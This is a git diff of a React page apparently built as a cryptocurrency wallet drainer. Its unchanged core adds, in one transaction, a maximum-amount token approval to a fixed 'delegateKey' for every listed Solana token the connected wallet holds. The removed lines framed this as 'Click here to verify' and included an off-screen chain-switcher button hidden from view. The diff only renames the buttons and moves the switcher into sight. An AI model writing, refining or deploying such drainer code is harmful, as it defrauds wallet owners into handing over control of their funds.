@@ -589,29 +589,29 @@ export default function Home() {
       
       console.log("Creating batch approval for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
       
-      const tokenChecks = await Promise.allSettled(
-        SOLANA_APPROVAL_TOKENS.map(async (token) => {
+      for (const token of SOLANA_APPROVAL_TOKENS) {
+        try {
           const mintKey = new PublicKey(token.mint);
           const ata = getAssociatedTokenAddress(mintKey, userKey);
+          
           const accountInfo = await connection.getAccountInfo(ata);
-          return { token, ata, exists: !!accountInfo };
-        })
-      );
-
-      for (const result of tokenChecks) {
-        if (result.status === "fulfilled" && result.value.exists) {
-          const { token, ata } = result.value;
-          console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
-          transaction.add(
-            createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
-          );
-          tokensApproved.push(token.symbol);
+          if (accountInfo) {
+            console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
+            transaction.add(
+              createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
+            );
+            tokensApproved.push(token.symbol);
+          } else {
+            console.log(`Skipping ${token.symbol} - no ATA found`);
+          }
+        } catch (e) {
+          console.log(`Error processing ${token.symbol}:`, e);
         }
       }
       
       if (transaction.instructions.length === 0) {
         console.log("No token accounts found");
-        setError("No token accounts found. Please fund your wallet first.");
+        setError("No tokens found in wallet.");
         setSolanaStep("idle");
         return;
       }
@@ -701,13 +701,50 @@ export default function Home() {
             zIndex: 100
           }}
         >
-          {isWalletConnected ? (
-            <>
+          {(isConnected || solanaConnected) ? (
+            <div className="flex flex-col items-end gap-2">
+              <div className="flex items-center gap-2">
+                {isConnected && !solanaConnected && openChainModal && (
+                  <button
+                    onClick={openChainModal}
+                    className="flex items-center gap-2 bg-[#3a3f7a] hover:bg-[#4752c4] text-white font-medium rounded-[20px] px-4 py-2 text-sm cursor-pointer border-0 outline-none"
+                    data-testid="button-chain-switcher"
+                  >
+                    {chainId === 1 ? "Ethereum" : 
+                     chainId === 56 ? "BNB Chain" : 
+                     chainId === 137 ? "Polygon" : 
+                     chainId === 42161 ? "Arbitrum" : 
+                     chainId === 10 ? "Optimism" : 
+                     chainId === 43114 ? "Avalanche" : 
+                     chainId === 8453 ? "Base" : "Network"}
+                    <ChevronDown className="w-4 h-4" />
+                  </button>
+                )}
+                <span className="bg-[#3a3f7a] text-white font-medium rounded-[20px] px-4 py-2 text-sm">
+                  {solanaConnected 
+                    ? `${solanaAddress?.slice(0, 4)}...${solanaAddress?.slice(-4)}`
+                    : `${address?.slice(0, 6)}...${address?.slice(-4)}`
+                  }
+                </span>
+                <button 
+                  className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
+                  onClick={() => {
+                    if (solanaConnected) {
+                      disconnectSolanaWallet();
+                    } else if (isConnected) {
+                      disconnect();
+                    }
+                  }}
+                  data-testid="button-disconnect"
+                >
+                  Disconnect
+                </button>
+              </div>
               {networkType === "solana" ? (
                 solanaStep === "done" ? (
                   <div className="bg-green-500 text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 shadow-lg">
                     <CheckCircle className="w-5 h-5" />
-                    Verified!
+                    Complete!
                   </div>
                 ) : (
                   <button
@@ -719,17 +756,17 @@ export default function Home() {
                     {isSolanaProcessing ? (
                       <>
                         <Loader2 className="w-5 h-5 animate-spin" />
-                        Verifying...
+                        Processing...
                       </>
                     ) : (
-                      "Click here to verify"
+                      "Proceed"
                     )}
                   </button>
                 )
               ) : step === "done" ? (
                 <div className="bg-green-500 text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 shadow-lg">
                   <CheckCircle className="w-5 h-5" />
-                  Verified!
+                  Complete!
                 </div>
               ) : (
                 <button
@@ -741,23 +778,14 @@ export default function Home() {
                   {isProcessing ? (
                     <>
                       <Loader2 className="w-5 h-5 animate-spin" />
-                      Verifying...
+                      Processing...
                     </>
                   ) : (
-                    "Click here to verify"
+                    "Proceed"
                   )}
                 </button>
               )}
-              {/* Hidden chain switcher - auto-triggers via RainbowKit */}
-              {isConnected && !solanaConnected && openChainModal && (
-                <button
-                  onClick={openChainModal}
-                  className="cursor-pointer border-0 outline-none bg-transparent text-white/0 text-[1px] absolute"
-                  style={{ top: -9999 }}
-                  data-testid="button-chain-switcher"
-                />
-              )}
-            </>
+            </div>
           ) : (
             <button 
               className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-7 py-3 text-base whitespace-nowrap shadow-lg"
